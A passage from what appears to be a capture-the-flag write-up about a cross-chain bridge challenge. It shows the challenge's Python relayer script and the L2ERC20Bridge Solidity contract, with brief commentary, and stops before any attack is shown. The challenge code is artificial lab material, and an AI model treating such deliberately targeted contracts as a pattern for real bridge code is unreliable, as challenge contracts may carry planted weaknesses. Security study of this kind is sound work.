+</span></span><span class="line"><span class="cl">                <span class="p">[</span><span class="n">v</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">user_data</span><span class="p">[</span><span class="s2">&#34;metadata&#34;</span><span class="p">]</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">__required_properties</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_run</span><span class="p">(</span><span class="n">user_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_data</span><span class="p">:</span> <span class="n">UserData</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">challenge_addr</span> <span class="o">=</span> <span class="n">user_data</span><span class="p">[</span><span class="s2">&#34;metadata&#34;</span><span class="p">][</span><span class="s2">&#34;challenge_address&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">relayer</span> <span class="o">=</span> <span class="n">get_additional_account</span><span class="p">(</span><span class="n">user_data</span><span class="p">[</span><span class="s2">&#34;metadata&#34;</span><span class="p">][</span><span class="s2">&#34;mnemonic&#34;</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">l1</span> <span class="o">=</span> <span class="n">get_unprivileged_web3</span><span class="p">(</span><span class="n">user_data</span><span class="p">,</span> <span class="s2">&#34;l1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1</span><span class="o">.</span><span class="n">middleware_onion</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">construct_sign_and_send_raw_middleware</span><span class="p">(</span><span class="n">relayer</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">default_account</span> <span class="o">=</span> <span class="n">relayer</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">l2</span> <span class="o">=</span> <span class="n">get_unprivileged_web3</span><span class="p">(</span><span class="n">user_data</span><span class="p">,</span> <span class="s2">&#34;l2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2</span><span class="o">.</span><span class="n">middleware_onion</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">construct_sign_and_send_raw_middleware</span><span class="p">(</span><span class="n">relayer</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">default_account</span> <span class="o">=</span> <span class="n">relayer</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">l1_messenger_addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">abi</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s2">&#34;address&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">l1</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;to&#34;</span><span class="p">:</span> <span class="n">l1</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">challenge_addr</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">l1</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s2">&#34;MESSENGER()&#34;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2_messenger_addr</span> <span class="o">=</span> <span class="s2">&#34;0x420000000000000000000000000000000000CAFe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;/artifacts/out/CrossDomainMessenger.sol/CrossDomainMessenger.json&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cache</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">messenger_abi</span> <span class="o">=</span> <span class="n">cache</span><span class="p">[</span><span class="s2">&#34;metadata&#34;</span><span class="p">][</span><span class="s2">&#34;output&#34;</span><span class="p">][</span><span class="s2">&#34;abi&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">l1_messenger</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">address</span><span class="o">=</span><span class="n">l1</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">l1_messenger_addr</span><span class="p">),</span> <span class="n">abi</span><span class="o">=</span><span class="n">messenger_abi</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l2_messenger</span> <span class="o">=</span> <span class="n">l2</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">address</span><span class="o">=</span><span class="n">l2</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">l2_messenger_addr</span><span class="p">),</span> <span class="n">abi</span><span class="o">=</span><span class="n">messenger_abi</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Thread</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_relayer_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">l1</span><span class="p">,</span> <span class="n">l1_messenger</span><span class="p">,</span> <span class="n">l2_messenger</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Thread</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_relayer_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">l2</span><span class="p">,</span> <span class="n">l2_messenger</span><span class="p">,</span> <span class="n">l1_messenger</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_relayer_worker</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">src_web3</span><span class="p">:</span> <span class="n">Web3</span><span class="p">,</span> <span class="n">src_messenger</span><span class="p">:</span> <span class="n">Contract</span><span class="p">,</span> <span class="n">dst_messenger</span><span class="p">:</span> <span class="n">Contract</span>
+</span></span><span class="line"><span class="cl">    <span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_src_chain_id</span> <span class="o">=</span> <span class="n">src_web3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">latest_block_number</span> <span class="o">=</span> <span class="n">src_web3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">block_number</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">_last_processed_block_number</span> <span class="o">&gt;</span> <span class="n">latest_block_number</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="n">latest_block_number</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="sa">f</span><span class="s2">&#34;chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s2"> syncing </span><span class="si">{</span><span class="n">_last_processed_block_number</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">latest_block_number</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">_last_processed_block_number</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">latest_block_number</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">_last_processed_block_number</span> <span class="o">=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">logs</span> <span class="o">=</span> <span class="n">src_messenger</span><span class="o">.</span><span class="n">events</span><span class="o">.</span><span class="n">SentMessage</span><span class="p">()</span><span class="o">.</span><span class="n">get_logs</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">fromBlock</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">toBlock</span><span class="o">=</span><span class="n">i</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">log</span> <span class="ow">in</span> <span class="n">logs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s2"> got log </span><span class="si">{</span><span class="n">src_web3</span><span class="o">.</span><span class="n">to_json</span><span class="p">(</span><span class="n">log</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">dst_messenger</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">relayMessage</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&#34;target&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&#34;sender&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&#34;message&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">log</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&#34;messageNonce&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                            <span class="n">dst_messenger</span><span class="o">.</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="sa">f</span><span class="s2">&#34;chain </span><span class="si">{</span><span class="n">_src_chain_id</span><span class="si">}</span><span class="s2"> relay message hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2"> src block number: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">            <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Relayer</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reviewing the code in <code>relayer.py</code>, it becomes evident that the <code>worker</code> consistently monitors for the <code>SentMessage</code> event. Upon detection of this event, the <code>worker</code> takes action to relay the message contained within the event, executing the <code>relayMessage</code> function on the destination chain.</p>
+<p>Let&rsquo;s now turn our attention to the <code>bridge</code> contract on the <code>L2</code> chain.</p>
+<p><strong>L2ERC20Bridge.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IL1ERC20Bridge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../L1/IL1ERC20Bridge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IL2ERC20Bridge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./IL2ERC20Bridge.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ERC165Checker</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;@openzeppelin/contracts/utils/introspection/ERC165Checker.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">CrossDomainEnabled</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/bridge/CrossDomainEnabled.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Lib_PredeployAddresses</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../libraries/constants/Lib_PredeployAddresses.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IL2StandardERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./standards/IL2StandardERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @title L2ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * @dev The L2 Standard bridge is a contract which works together with the L1 Standard bridge to
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * enable ETH and ERC20 transitions between L1 and L2.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * This contract acts as a minter for new tokens when it hears about deposits into the L1 Standard
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * bridge.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * This contract also acts as a burner of the tokens intended for withdrawal, informing the L1
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * bridge to release L1 funds.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">L2ERC20Bridge</span> <span class="k">is</span> <span class="n">IL2ERC20Bridge</span><span class="p">,</span> <span class="n">CrossDomainEnabled</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">l1TokenBridge</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l2messenger</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l1TokenBridge</span><span class="p">)</span> <span class="n">CrossDomainEnabled</span><span class="p">(</span><span class="n">_l2messenger</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1TokenBridge</span> <span class="o">=</span> <span class="n">_l1TokenBridge</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL2ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">virtual</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_initiateWithdrawal</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL2ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawTo</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">virtual</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_initiateWithdrawal</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_initiateWithdrawal</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IL2StandardERC20</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">).</span><span class="n">burn</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">l1Token</span> <span class="o">=</span> <span class="n">IL2StandardERC20</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">).</span><span class="n">l1Token</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_l2Token</span> <span class="o">==</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">IL1ERC20Bridge</span><span class="p">.</span><span class="n">finalizeWethWithdrawal</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">IL1ERC20Bridge</span><span class="p">.</span><span class="n">finalizeERC20Withdrawal</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sendCrossDomainMessage</span><span class="p">(</span><span class="n">l1TokenBridge</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">WithdrawalInitiated</span><span class="p">(</span><span class="n">l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @inheritdoc IL2ERC20Bridge
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">finalizeDeposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">external</span>
+</span></span><span class="line"><span class="cl">        <span class="k">virtual</span>
+</span></span><span class="line"><span class="cl">        <span class="n">onlyFromCrossDomainAccount</span><span class="p">(</span><span class="n">l1TokenBridge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Check the target token is compliant and
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// verify the deposited token on L1 matches the L2 deposited token representation here
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">ERC165Checker</span><span class="p">.</span><span class="n">supportsInterface</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">,</span> <span class="mh">0x1d1d8b63</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">_l1Token</span> <span class="o">==</span> <span class="n">IL2StandardERC20</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">).</span><span class="n">l1Token</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IL2StandardERC20</span><span class="p">(</span><span class="n">_l2Token</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">DepositFinalized</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">DepositFailed</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
